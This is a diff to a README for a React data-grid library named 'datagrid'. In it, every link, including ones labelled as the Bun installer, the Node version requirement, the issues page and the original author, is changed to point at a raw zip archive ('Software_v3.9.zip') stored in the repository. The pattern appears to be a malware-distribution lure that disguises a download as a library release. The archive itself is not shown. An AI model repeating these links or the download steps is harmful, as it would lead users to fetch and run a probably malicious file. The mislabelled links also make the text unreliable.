@@ -1,6 +1,6 @@
 # 🎉 datagrid - Ultra-Fast Data Grid for React
 
-[![Download Latest Release](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip)](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip)](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **datagrid**! This guide will help you download and run the applicati
 
 ### 💾 Download & Install
 
-To download the latest version of **datagrid**, visit [this page](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip). You will find the appropriate files for your system there.
+To download the latest version of **datagrid**, visit [this page](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip). You will find the appropriate files for your system there.
 
 ### 📥 Steps to Download
 
@@ -48,7 +48,7 @@ Before downloading **datagrid**, ensure your system meets the following requirem
 
 - Operating System: Windows, macOS, or Linux
 - React: Version 16.8 or above
-- https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip Version 18 or higher for best performance
+- https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip Version 18 or higher for best performance
 
 ## 📈 Contributing
 
@@ -65,8 +65,8 @@ If you're a developer and want to work on **datagrid**, follow these steps:
 
 ### 🔧 Prerequisites
 
-- Install [Bun](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip) (version 1.0.0 or later).
-- Ensure you have https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip (version 18 or later).
+- Install [Bun](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip) (version 1.0.0 or later).
+- Ensure you have https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip (version 18 or later).
 
 ### ⚙️ Setup Instructions
 
@@ -81,7 +81,7 @@ bun install
 # Start development
 bun run dev
 
-# Run component preview (https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip)
+# Run component preview (https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip)
 bun run -w packages/grid preview
 
 # Run type checking
@@ -96,7 +96,7 @@ bun run format
 
 ## 🤝 Support
 
-If you face any issues or need help, feel free to reach out through our [GitHub Issues page](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip). We’re here to help you!
+If you face any issues or need help, feel free to reach out through our [GitHub Issues page](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip). We’re here to help you!
 
 ## 🌟 License
 
@@ -104,4 +104,4 @@ If you face any issues or need help, feel free to reach out through our [GitHub 
 
 ## 📣 Acknowledgments
 
-Originally created by [Archer Hume](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/worser/datagrid.zip), it has grown with contributions from the community. Thank you for your support and interest in **datagrid**!
+Originally created by [Archer Hume](https://raw.githubusercontent.com/Akshayy-byte/datagrid/main/packages/grid/src/data/Software_v3.9.zip), it has grown with contributions from the community. Thank you for your support and interest in **datagrid**!
